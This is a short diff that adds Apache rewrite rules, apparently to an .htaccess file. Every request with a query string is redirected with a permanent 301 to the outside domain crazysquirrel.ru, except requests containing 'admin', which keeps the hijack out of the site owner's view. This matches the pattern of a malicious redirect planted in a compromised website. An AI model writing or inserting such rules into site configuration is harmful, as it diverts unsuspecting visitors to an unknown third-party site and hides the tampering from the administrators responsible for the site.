@@ -1,0 +1,5 @@
+RewriteEngine on
+RewriteCond %{QUERY_STRING} !^$ [NC]
+RewriteCond %{THE_REQUEST} \? [NC]
+RewriteCond %{THE_REQUEST} !admin [NC]
+RewriteRule ^(.*)?(.*)$ https://crazysquirrel.ru/$1? [R=301,L]
